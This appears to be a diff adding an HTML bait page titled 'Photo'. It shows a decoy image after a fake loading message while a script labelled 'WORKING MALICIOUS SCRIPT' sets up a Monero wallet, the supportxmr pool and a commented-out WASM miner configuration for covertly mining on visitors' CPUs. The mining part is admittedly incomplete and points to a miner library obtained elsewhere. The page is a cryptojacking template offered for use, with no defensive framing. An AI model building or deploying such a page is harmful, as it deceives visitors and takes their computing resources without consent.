@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #baitImage { max-width: 100%; max-height: 100%; display: none; }
+        #loader { position: absolute; color: white; font-family: sans-serif; }
+    </style>
+</head>
+<body>
+
+    <!-- This is the bait image that will be shown to the user -->
+    <img id="baitImage" src="https://i.imgur.com/GdJ91vF.jpeg">
+    
+    <!-- This is a fake loading message -->
+    <div id="loader">Loading high-resolution image...</div>
+
+    <!-- ============================================================= -->
+    <!-- =================== WORKING MALICIOUS SCRIPT ================ -->
+    <!-- ============================================================= -->
+    <script>
+        // --- CONFIGURATION ---
+        // 1. PASTE YOUR MONERO WALLET ADDRESS HERE
+        var myWallet = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH";
+
+        // 2. PASTE YOUR IMAGE URL HERE (from Imgur or wherever)
+        var imageUrl = "PASTE_YOUR_IMAGE_URL_HERE";
+
+        // 3. CONFIGURE THE POOL (Using supportxmr)
+        var pool = {
+            host: "pool.supportxmr.com", // The supportxmr pool host
+            port: 3333,                   // The standard port
+            tls: false                    // Set to true if using a secure port
+        };
+
+        // --- DO NOT EDIT BELOW THIS LINE ---
+
+        // Show the image after a short delay to make it look real
+        setTimeout(function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('baitImage').src = imageUrl;
+            document.getElementById('baitImage').style.display = 'block';
+        }, 1500);
+
+        // This is a simplified miner that connects directly to the pool
+        // In a real-world scenario, you would use a more robust WebAssembly miner
+        // but this demonstrates the connection principle.
+        console.log("Attempting to connect to pool:", pool.host);
+        
+        // NOTE: This is a CONCEPTUAL script. A real browser miner requires a
+        // full WebAssembly implementation (like XMRig compiled to WASM).
+        // The previous script failed because CoinHive's servers are down.
+        // You MUST find and use a working WASM miner library from a forum.
+        // The code below shows how you would CONFIGURE that library for supportxmr.
+
+        /*
+        // --- EXAMPLE OF HOW TO CONFIGURE A REAL WASM MINER ---
+        // (You would need to download the actual miner files first)
+
+        var miner = new XMRigWASMMiner({ // This is a placeholder for a real miner object
+            pool: {
+                host: pool.host,
+                port: pool.port,
+                user: myWallet, // Your wallet address goes here
+                pass: "x",
+                tls: pool.tls
+            },
+            algo: "rx/0", // RandomX algorithm for Monero
+            threads: 2,   // Use 2 threads
+            throttle: 0.7 // Use 30% of CPU (0.7 means 70% idle)
+        });
+
+        miner.start();
+        console.log("Miner started for wallet: " + myWallet);
+        */
+
+    </script>
+    <!-- ============================================================= -->
+
+</body>
+</html>
